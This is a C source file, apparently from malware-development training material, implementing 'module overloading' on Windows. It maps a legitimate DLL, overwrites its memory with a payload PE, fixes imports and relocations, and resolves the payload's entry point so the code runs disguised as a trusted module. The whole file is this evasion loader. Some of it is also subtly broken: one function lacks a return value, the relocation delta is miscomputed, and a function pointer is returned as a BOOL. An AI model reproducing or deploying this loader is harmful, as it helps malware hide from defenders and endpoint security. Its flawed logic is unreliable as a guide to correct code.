#include "box.h"

// https://github.com/hasherezade/module_overloading
// Maldev Academy

BOOL ReadTargetFile
(
	IN LPCSTR PeName,
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	HANDLE	hFile = NULL;
	BOOL	State = TRUE;
	DWORD	lpNumberOfBytesRead = 0;
	DWORD	NumberOfBytesToRead = 0;
	LPVOID	lppBuffer = NULL;

	if (!PeName || !lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	if ((hFile = CreateFileA(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);


	if ((NumberOfBytesToRead = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Current File Size", NumberOfBytesToRead);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesToRead)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesToRead);


	if (!ReadFile(hFile, lppBuffer, NumberOfBytesToRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Successfully Read File!");

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = NumberOfBytesToRead;

CLEANUP:

	CLOSEHANDLE(hFile);

	return State;

}

BOOL GrabPeHeader
(
	IN  LPVOID lpFile,
	OUT PPEHEADERS pPe
)

{

	PEHEADERS PeHeaders = { 0 };

	PBYTE pBase = (PBYTE)lpFile;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return FALSE;
	}

	PIMAGE_NT_HEADERS64 pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return FALSE;
	}


	PeHeaders.pImgNt = pImgNt64;
	PeHeaders.pImgSecHeader = IMAGE_FIRST_SECTION(PeHeaders.pImgNt);
	PeHeaders.pImgDataDir = PeHeaders.pImgNt->OptionalHeader.DataDirectory;
	PeHeaders.pImgDirEntryImport = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PeHeaders.pImgDirEntryBaseReloc = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	PeHeaders.pImgDirEntryTls = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_TLS];
	PeHeaders.pImgDirEntryException = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	PeHeaders.pImgDirEntryExport = &PeHeaders.pImgDataDir[IMAGE_DIRECTORY_ENTRY_EXPORT];

	*pPe = PeHeaders;

	return TRUE;

}

BOOL MapDllFile
(
	IN LPCSTR DllFile,
	OUT PVOID* DllBaseAddress,
	OUT SIZE_T* ImageSize
)
{

	BOOL State = TRUE;
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hSection = NULL;
	HMODULE Ntdll = NULL;
	PVOID BaseAddress = NULL;
	SIZE_T ViewSize = 0;

	Ntdll = GetModuleHandleA("ntdll");
	if (Ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}

	LOADAPI(Ntdll, pNtCreateSection, NtCreateSection);
	LOADAPI(Ntdll, pNtMapViewOfSection, NtMapViewOfSection);

	if ((hFile = CreateFileA(DllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Open File: %s", DllFile);
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Opened File %s", DllFile);

	if (!NT_SUCCESS((status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile))))
	{
		WARN("Failed to Create New Section!");
		NTERROR("NtCreateSection");
		State = FALSE; goto CLEANUP;
	}

	if (!NT_SUCCESS((status = NtMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &ViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE))))
	{
		WARN("Failed To Map Section!");
		NTERROR("NtMapViewOfSection");
		State = FALSE; goto CLEANUP;
	}

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)BaseAddress;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return FALSE;
	}

	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)BaseAddress + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return FALSE;
	}

	*DllBaseAddress = BaseAddress;
	*ImageSize = pImgNt->OptionalHeader.SizeOfImage;

CLEANUP:

	CLOSEHANDLE(hSection);
	CLOSEHANDLE(hFile);

	return State;
}

BOOL fixReloc
(
	IN DWORD RelocRVA,
	IN PVOID PeBase,
	IN DWORD_PTR dwDelta
)
{

	if (!PeBase || RelocRVA == 0)
		return FALSE;

	if (RelocRVA)
	{

		PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)PeBase + RelocRVA);

		while (Reloc->VirtualAddress)
		{
			DWORD size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

			for (DWORD i = 0; i < size; i++)
			{
				if (relocationRVA[i].Type == IMAGE_REL_BASED_DIR64)
				{
					ULONGLONG* PatchedAddress = (ULONGLONG*)((PBYTE)PeBase + Reloc->VirtualAddress + relocationRVA[i].Offset);
					*PatchedAddress += (ULONGLONG)dwDelta;
				}
			}
			Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);
		}
	}

	return TRUE;

}

BOOL FixIAT
(
	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
	IN PBYTE dllBase
)
{

	if (pImgDataDir->Size > 0)
	{
		PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(dllBase + pImgDataDir->VirtualAddress);

		for (SIZE_T i = 0; i < pImgDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
		{
			pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pImgDataDir->VirtualAddress + dllBase + i);

			if (pImportDesc->OriginalFirstThunk == NULL && pImportDesc->FirstThunk == NULL)
				break;

			LPSTR cDllName = (LPSTR)(dllBase + pImportDesc->Name);
			HMODULE hModule = LoadLibraryA(cDllName);

			if (!hModule)
				return FALSE;

			ULONG_PTR uOriginalFirstThunkRVA = pImportDesc->OriginalFirstThunk;
			ULONG_PTR uFirstThunkRVA = pImportDesc->FirstThunk;
			SIZE_T ImgThunkSize = 0;

			while (TRUE)
			{
				PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(dllBase + uOriginalFirstThunkRVA + ImgThunkSize);
				PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(dllBase + uFirstThunkRVA + ImgThunkSize);

				if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
					break;

				FARPROC pfnImportedFunc;

				if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
				{
					pfnImportedFunc = GetProcAddress(hModule, (LPCSTR)(pOriginalFirstThunk->u1.Ordinal & 0xFFFF));
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(dllBase + pOriginalFirstThunk->u1.AddressOfData);
					pfnImportedFunc = GetProcAddress(hModule, pImportByName->Name);
				}

				pFirstThunk->u1.Function = (ULONG_PTR)pfnImportedFunc;
				ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
			}
		}
	}

	return TRUE;
}

BOOL ChangeProtection
(
	IN PVOID TargetBaseAddress,
	IN PEHEADERS PeHeader
)
{

	for (int i = 0; i < PeHeader.pImgNt->FileHeader.NumberOfSections; i++)
	{

		DWORD dwProtection = 0;
		DWORD dwOldProt = 0;

		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if ((PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ) && (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_READWRITE;

		if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			if (PeHeader.pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProtection = PAGE_EXECUTE_READWRITE;
			else
				dwProtection = PAGE_EXECUTE_READ;
		}

		PVOID BaseAddress = (PVOID)((PBYTE)TargetBaseAddress + PeHeader.pImgSecHeader[i].VirtualAddress);
		SIZE_T Size = PeHeader.pImgSecHeader[i].SizeOfRawData;

		if (!VirtualProtect(BaseAddress, Size, dwProtection, &dwOldProt))
		{
			WARN("Failed To Change Memory Protection!");
			PRINT_ERROR("VirtualProtect");
			return FALSE;
		}

		INFO("Current Protection --> [%ld]", dwProtection);

	}

}

BOOL OverwriteTargetDll
(
	IN PVOID MappedAddress,
	IN SIZE_T ImageSize,
	IN PBYTE Buffer,
	IN SIZE_T BufferSize
)
{

	DWORD dwOldProt = 0;

	if (!VirtualProtect((LPVOID)MappedAddress, ImageSize, PAGE_READWRITE, &dwOldProt))
	{
		WARN("Failed To Change Memory Protection!");
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("New Memory Protection --> PAGE_READWRITE");

	memset(MappedAddress, 0, ImageSize);
	memcpy(MappedAddress, Buffer, BufferSize);

	return TRUE;

}

BOOL ModuleOverload
(
	IN LPCSTR PePayload,
	IN LPCSTR TargetDll,
	IN LPVOID FileBuffer,
	IN PEHEADERS PeHeader
)
{

	BOOL State = TRUE;
	PBYTE PeBaseAddress = 0;
	PVOID DllBaseAddress = NULL;
	SIZE_T ImageSize = 0;
	DWORD dwOldProt = 0;

	INFO("Successfully Read Target File");

	if (!MapDllFile(TargetDll, &DllBaseAddress, &ImageSize))
	{
		WARN("Failed To Map Dll File to --> %s", TargetDll);
		PRINT_ERROR("MapDllFile");
		State = FALSE; goto CLEANUP;
	}

	INFO("Successfully Mapped DLL File");
	INFO("%s Base Addess --> [0x%p] W/ a Size of --> [%zu]", TargetDll, DllBaseAddress, ImageSize);

	if (!((PeBaseAddress = VirtualAlloc(NULL, PeHeader.pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))))
	{
		WARN("Failed To Allocate %ld bytes to PeBaseAddress!", PeHeader.pImgNt->OptionalHeader.SizeOfImage);
		PRINT_ERROR("VirtualAlloc");
		return FALSE;
	}

	INFO("Allocated %ld bytes to PeBaseAddress!", PeHeader.pImgNt->OptionalHeader.SizeOfImage);

	memcpy(PeBaseAddress, FileBuffer, PeHeader.pImgNt->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < PeHeader.pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (PeHeader.pImgSecHeader->SizeOfRawData == 0)
			continue;

		memcpy(
			(PVOID)(PeBaseAddress + PeHeader.pImgSecHeader[i].VirtualAddress),
			(PVOID)((PBYTE)FileBuffer + PeHeader.pImgSecHeader[i].PointerToRawData),
			PeHeader.pImgSecHeader[i].SizeOfRawData
		);

	}

	if (!FixIAT(PeHeader.pImgDataDir, PeBaseAddress))
	{
		WARN("Failed To Fix Import Address Table!");
		PRINT_ERROR("FixIAT");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Fixed IAT");

	if (!OverwriteTargetDll(DllBaseAddress, ImageSize, PeBaseAddress, PeHeader.pImgNt->OptionalHeader.SizeOfImage))
	{
		WARN("Failed To Overwrite Memory Inside: %s", TargetDll);
		PRINT_ERROR("OverwriteTargetDll");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Overwrote Target DLL's Memory");

	DWORD_PTR dwDelta = (&DllBaseAddress - PeHeader.pImgNt->OptionalHeader.ImageBase);
	if (!fixReloc(PeHeader.pImgDirEntryBaseReloc->VirtualAddress, DllBaseAddress, dwDelta))
	{
		WARN("Failed To Fix The Relocation Table!");
		PRINT_ERROR("fixReloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("Fixed Reloc Table");

	if (!VirtualProtect(DllBaseAddress, PeHeader.pImgNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProt))
	{
		WARN("Failed To Change Protections To PAGE_READONLY!");
		PRINT_ERROR("VirtualProtect");
		State = FALSE; goto CLEANUP;
	}

	INFO("Changed Protection --> PAGE_READONLY");

	if (!ChangeProtection(DllBaseAddress, PeHeader))
	{
		WARN("Failed To Change Memory Permissions!");
		PRINT_ERROR("ChangeProtection");
		State = FALSE; goto CLEANUP;
	}

	PBYTE EntryPoint = (PBYTE)((PBYTE)DllBaseAddress + PeHeader.pImgNt->OptionalHeader.AddressOfEntryPoint);

#ifdef DLL
	PDLLMAIN pEntry = (PDLLMAIN)EntryPoint;
	return pEntry;
#else
	PMAIN pEntry = (PMAIN)EntryPoint;
	return pEntry;
#endif

CLEANUP:

	FREEMEMORY(PeBaseAddress);

	return State;

}